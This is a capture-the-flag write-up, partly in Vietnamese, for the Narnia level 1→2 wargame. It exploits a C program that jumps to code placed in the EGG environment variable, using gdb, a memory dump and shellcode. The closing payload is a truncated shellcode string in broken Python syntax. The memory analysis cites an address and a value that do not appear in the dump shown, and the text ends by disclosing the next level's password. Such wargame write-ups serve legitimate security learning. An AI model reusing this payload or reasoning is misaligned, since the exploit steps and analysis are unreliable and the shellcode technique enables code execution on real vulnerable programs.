# Challenge Binary exploit 2

* **Category:** PWN
* **Points:** No

## Challenge

Narnia Level 1 → Level 2

## Solution

Source CODE

```c
#include <stdio.h>

int main(){
    int (*ret)();

    if(getenv("EGG")==NULL){
        printf("Give me something to execute at the env-variable EGG\n");
        exit(1);
    }

    printf("Trying to execute EGG!\n");
    ret = getenv("EGG");
    ret();

    return 0;
}
```

### Phân tích đề

```c
     int (*ret)();
```

Bên trong main()chúng ta thấy đoạn mã trên khai báo ret()hàm như một nguyên mẫu để sử dụng thêm trong đoạn mã. Bởi vì lập trình C là thủ tục, việc xác định nó trước tiên sẽ giúp chúng ta tránh được lỗi khi biên dịch. Bây giờ chúng ta hãy truy cập vào if xem ra sao.

```c
    if(getenv("EGG")==NULL){
        printf("Give me something to execute at the env-variable EGG\n");
        exit(1);
    }
```

Ta thấy lệnh if này sẽ lấy biến môi trường, nếu như trống thì sẽ in ra thông báo và thoát ra ngoài.

Ngược lại nếu có dữ liệu nó sẽ gán dữ liệu môi trường vào ret , sau đó thực thi và out

## Vậy ta sẽ giải quyết ra sao

Dùng trình gỡ lỗi gdb

Trước tiên ta cần gán biến môi trường EGG = dữ liệu

Xem có gì xảy ra không

```c
    Trying to execute EGG!
    Segmentation fault
```

Lỗi phân đoạn, nhìn vào đó, chúng ta có một "Lỗi phân đoạn". Điều này có nghĩa là chúng tôi có một tình trạng bất thường khiến chương trình thoát ra.

```
    Dump of assembler code for function main:
   0x0804846b <+0>:     push   ebp
   0x0804846c <+1>:     mov    ebp,esp
   0x0804846e <+3>:     sub    esp,0x4
   0x08048471 <+6>:     push   0x8048540
   0x08048476 <+11>:    call   0x8048320 <getenv@plt>
   0x0804847b <+16>:    add    esp,0x4
   0x0804847e <+19>:    test   eax,eax
   0x08048480 <+21>:    jne    0x8048496 <main+43>
   0x08048482 <+23>:    push   0x8048544
   0x08048487 <+28>:    call   0x8048330 <puts@plt>
   0x0804848c <+33>:    add    esp,0x4
   0x0804848f <+36>:    push   0x1
   0x08048491 <+38>:    call   0x8048340 <exit@plt>
   0x08048496 <+43>:    push   0x8048579
   0x0804849b <+48>:    call   0x8048330 <puts@plt>
   0x080484a0 <+53>:    add    esp,0x4
   0x080484a3 <+56>:    push   0x8048540
   0x080484a8 <+61>:    call   0x8048320 <getenv@plt>
   0x080484ad <+66>:    add    esp,0x4
   0x080484b0 <+69>:    mov    DWORD PTR [ebp-0x4],eax
   0x080484b3 <+72>:    mov    eax,DWORD PTR [ebp-0x4]
   0x080484b6 <+75>:    call   eax
   0x080484b8 <+77>:    mov    eax,0x0
   0x080484bd <+82>:    leave
   0x080484be <+83>:    ret
End of assembler dump.
```

Di chuyển xuống đến địa chỉ bộ nhớ 0x080484a8 thông qua 0x080484b3, đây là nơi mà các cuộc gọi chương trình getenv ( “EGG”) trong chương trình, làm cho không gian trên stack, và chuyển nhượng các dữ liệu trong “EGG” vào EAX thanh ghi. Nhìn vào 0x080484b6 địa chỉ bộ nhớ, chúng ta thấy chương trình đang call eax là hàm ret () đang được thực thi. Điểm dừng đầu tiên của chúng ta để xem điều gì đang xảy ra là đặt điểm ngắt trên lệnh gọi đó và xem những gì có trên ngăn xếp.

Sau khi thực hiện gán biến môi trường

giờ ta đặt break point tại 0x080484b6 và run

xong rồi ta view địa chỉ bộ nhớ chứa dữ liệu biến môi trường

```c
0xffffde9d:     0x5f004443      0x73752f3d      0x69622f72      0x64672f6e
0xffffdead:     0x414c0062      0x653d474e      0x53555f6e      0x4654552e
0xffffdebd:     0x4f00382d      0x5750444c      0x682f3d44      0x2f656d6f
0xffffdecd:     0x6e72616e      0x00316169      0x52455355      0x72616e3d
0xffffdedd:     0x3161696e      0x44575000      0x616e2f3d      0x61696e72
```

Nhìn vào địa chỉ đầu tiên bên trái ( 0xffffdea7), chúng ta thấy giá trị đầu tiên 0x5f006463. Nếu chúng ta chuyển đổi từ hex sang ascii, chúng ta có thể thấy hai byte cuối cùng 64 và 63 chuyển đổi thành d và c tương ứng

Như vậy ta cần làm sao dể ghi đè lên cái biến môi trường

Bài này ta dùng shellcode để điều khiển đoạn mình muốn thực thi

Visit http://shell-storm.org/shellcode/

## Payload

```python
 export EGG=$(python -c 'python "xeb\x11\x5e\x31..."'.filename)
```

```
The flag : nairiepecu
```

Mật khẩu của cấp độ tiếp theo.
